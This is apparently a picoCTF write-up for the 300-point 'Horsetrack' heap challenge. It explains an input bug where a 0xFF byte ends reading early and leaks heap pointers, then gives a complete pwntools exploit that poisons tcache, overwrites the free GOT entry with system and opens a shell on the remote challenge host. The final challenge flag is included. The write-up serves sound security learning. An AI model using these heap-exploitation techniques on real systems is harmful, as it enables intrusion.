# Horsetrack
Points: 300

This problem is a standard heap challenge.
```
1. Add a horse
2. Remove a horse
3. Race
4. Exit
Choice: 
```
There is also one hidden menu option not displayed to the user, which allows overwriting the first 16 bytes of any chunk.
```
0. Cheat
```

The vulnerability is how the binary takes in input.
```c
void input(char *param_1,uint param_2) {
    int iVar1;
    char *local_20;
    char local_d;
    int local_c;

    printf("Enter a string of %d characters: ",(ulong)param_2);
    local_c = 0;
    local_20 = param_1;
    while( true ) {
        if ((int)param_2 <= local_c) {
            do {
                iVar1 = getchar();
            } while ((char)iVar1 != '\n');
            *local_20 = '\0';
            return;
        }
        iVar1 = getchar();
        local_d = (char)iVar1;
        while (local_d == '\n') {
            iVar1 = getchar();
            local_d = (char)iVar1;
        }
        if (local_d == -1) break;
        *local_20 = local_d;
        local_c = local_c + 1;
        local_20 = local_20 + 1;
    }
    return;
}
```
The issue is that the `input` function will bail if `getchar` ever returns `-1`. You might think that a `-1` return value
only occurs if `getchar` fails to read, but `getchar` return type of `getchar` is a signed int, not a char. This means that
if `getchar` ever reads the character `0xFF` it will be casted to `-1` and the input function will end early.

Why is this important? If the input function does not populate the allocated chunks with data, then heap pointers can be leaked
because the old data in the chunks was not overwritten.

The binary is position dependent, and contains a dynamic entry for `system`, meaning that we do not have to worry about the libc.
The binary is also using glibc 2.35, meaning that in order to overwrite points in the tcache or fastbin we need a heap leak first.
Thankfully this can be accomplished using the bug described above.

Exploit:
1. leak heap address
2. calculate heap base
3. use the hidden edit function to overwrite a tcache chunk next pointer to the `free` GOT entry
4. overwrite the `free` GOT entry to point to the `system` PLT entry
5. delete a chunk that contains `/bin/sh`, triggering a call to `system("/bin/sh")` and popping a shell

```python
from pwn import *
from z3 import *
import sys

file = ELF("./vuln")
if args.REMOTE:
    io = remote("saturn.picoctf.net", 55281)
else:
    io = process("./vuln", stderr=sys.stdout)

choice = b"Choice: "
number = b"? "

def make(index, data, length=None):
    io.sendlineafter(choice, b"1")
    io.sendlineafter(b"? ", str(index).encode())
    if length == None:
        length = len(data)
    io.sendlineafter(b"? ", str(length).encode())
    io.sendlineafter(b": ", data)

def kill(index):
    io.sendlineafter(choice, b"2")
    io.sendlineafter(b"? ", str(index).encode())

def edit(index, weight, data):
    io.sendlineafter(choice, b"0")
    io.sendlineafter(b"? ", str(index).encode())
    io.sendlineafter(b": ", data)
    io.sendlineafter(b"? ", str(weight).encode())

def race():
    io.sendlineafter(choice, b"3")

def parse(horses):
    def find(haystack, needles):
        split = 12345
        for needle in needles:
            try:
                now = haystack.index(needle)
                split = min(split, now)
            except:
                continue
        return split

    lines = list()
    for i in range(horses):
        line = io.recvline().strip()
        split = find(line, b" \n|")
        line = line[:split]
        lines.append(line)
    return lines

def dec(leaked, off):
    leaked = BitVecVal(leaked, 48)
    off  = BitVecVal(off,48)

    res  = BitVec('res', 48)
    sss  = BitVec('sss', 48)

    s = Solver()

    s.add((sss>>12)^res==leaked)
    s.add((sss>>12)-(res>>12)==off)
    s.add((res>>40)<=0x7f)
    s.add((res>>40)>=0)

    if str(s.check()) == 'sat':
        m = s.model()
        return  m.evaluate(res).as_long() & 0xfffffffff000
    else:
        print(s.check())
        exit(1)

for i in range(5):
    make(i, b"A" * 0x38)
for i in range(5):
    kill(i)
for i in range(5):
    make(i, b"\xFF", length=0x38)

race()
leaks = parse(5)
for leak in leaks:
    leak = u64(leak.ljust(8, b'\x00'))
    print(f"[+] leak: 0x{leak:x}")
a = u64(leaks[1].ljust(8, b"\x00"))
heap_base = dec(a, 0x5b0)
print(f"[+] heap base: 0x{heap_base:x}")

kill(3)
kill(4)
edit(4, 0, p64((file.got["free"] - 8) ^ (heap_base >> 12)) + b"\xFF")
make(4, b"\xFF", length=0x38)
make(5, b"\x00" * 8 + p64(file.plt["system"]) + b"\xFF", length=0x38)
edit(4, 0, b"/bin/sh\x00" + b"\xFF")
kill(4)

io.interactive()
```

# Flag: `picoCTF{t_cache_4ll_th3_w4y_2_th4_b4nk_237a0607}`